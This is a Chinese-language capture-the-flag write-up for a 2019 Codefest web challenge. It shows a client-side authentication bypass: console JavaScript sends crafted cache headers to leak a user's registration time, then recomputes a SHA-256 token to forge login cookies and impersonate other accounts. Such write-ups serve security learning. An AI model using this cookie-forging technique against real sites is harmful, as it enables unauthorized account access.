難度 :  :star::star:
  
![question](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/pic1.png)
![question2](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/pic2.png)
![question3](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/pic3.png)
![question4](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/pic4.png)
![question5](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/pic5.png)

解題流程: <br>
        很簡潔的網頁, 只有登入和註冊, 登入後什麼東西都沒有 <br>
        用 sqlmap 和 xss 都沒有結果, 只能開始看看前端的 code <br>
        發現它引入一個客製化的 challenge.js <br>
        ![bug](https://github.com/dreamisadream/CTF/blob/master/CTF_CONTEST/2019/codefest/No%20Fatshaming/bug.png)<br>
        進去一看發現是認證的 code , 認證 code 寫在前端往往不怎麼安全 <br>
        看一下 code 寫些什麼 <br>
        首先, 命名的方式很差所以先[美化](http://www.jsnice.org/)一下<br>
        美化後的結果放在 nice.js <br>
        從 nice.js 得知, 當按下 Log in! 後會去執行 setup
```javascript=
$("#login-form")["submit"]((result) => {
    result["preventDefault"]();
    setUpUserAutosuggest();
  });
```
 setup  會去檢查註冊時間和 cookie 設的是否一樣
 ``` javascript=
 if (data["time"] != val) {
              config["failure"]();
}
```
一樣的話執行 login 否則執行 doLogin <br>
而 login 會檢查 id 和 cck <br>
其中, cck 由 factory 計算而來 <br>
因此, 思緒就清楚了, <b>我們要的是 id cck 和 time</b>
id 可以自行控制 , cck 由 id 和 time 決定 , 因此關鍵在 time <br>
而我們得知 time 會在 setup 被用到, 所以設計自己的 setup 並輸入到 console <br>
```javascript=
function setup(id) {
    $["ajax"]({
          "url" : "api/login/",
          "type" : "POST",
          "headers" : {
            "X-Cache-Command" : "META",
            "X-Cache-User" : id
          },
          "success" : (data) => {
                console.log(data);
            }
    });
}
```
( 什麼都不要檢查, 把接收到的 data 全部吐出來 )<br>
輸入 setup(1), 我們就拿到 time 了 <br>
接著我們透過 _build 幫我們設定 cookie <br>
```javascript=
function factory(spec) {
    var shaObj = new jsSHA("SHA-256", "TEXT");
    var existing = spec["id"] + " 000 114328 000 " + spec["time"];
    shaObj["update"](existing);
    var KongPluginsService = shaObj["getHash"]("HEX");
    return KongPluginsService;
}
function _build(value) {
    Cookies["set"]("id", value["id"]);
    Cookies["set"]("time", value["time"]);
    Cookies["set"]("cck", factory(value));
  }
```
因為 _build 會用到 factory 所以 factory 也要一併傳入 <br>
接著, 輸入 _build({"id":"1", "time": "剛剛接收到的"}) <br>
最後, 將 username 也就是 id 輸入 1, 按 Log in! 就能成功進去了 , 但 flag 在 id=6 的身上 <br>
